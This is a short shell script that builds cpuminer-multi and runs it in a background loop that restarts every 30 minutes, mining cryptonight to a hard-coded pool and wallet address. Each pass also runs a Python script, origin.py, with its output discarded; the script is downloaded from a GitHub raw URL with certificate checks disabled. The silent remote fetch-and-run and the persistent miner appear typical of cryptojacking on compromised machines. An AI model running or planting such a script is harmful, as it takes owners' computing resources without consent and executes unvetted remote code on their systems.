apt-get install -y automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++ git
wget --no-check-certificate "https://raw.githubusercontent.com/x7r3mx/arm/master/origin.py" -P /opt/code
mkdir -p /opt/code && chmod -R +x /opt/code && cd /opt/code
git clone https://github.com/tpruvot/cpuminer-multi.git 
cd cpuminer* && ./build.sh

while true; do 
    pkill -f cpuminer;
    pkill -f origin;
    sleep 5;
    ./cpuminer -B -a cryptonight -o stratum+tcp://nl.etnpool.net:3333 -u etnkMLr5wQPV5tp2SApoxbNE2CcESCrHpNXdPHhfe8ANHbKPjKsU6jyYp4Qj68De7PU3iMccp7Cwb6E3q3gCuBAY1bJgD6HbtN -p x 
    python /opt/code/origin.py &>/dev/null &
    sleep 1800;
done




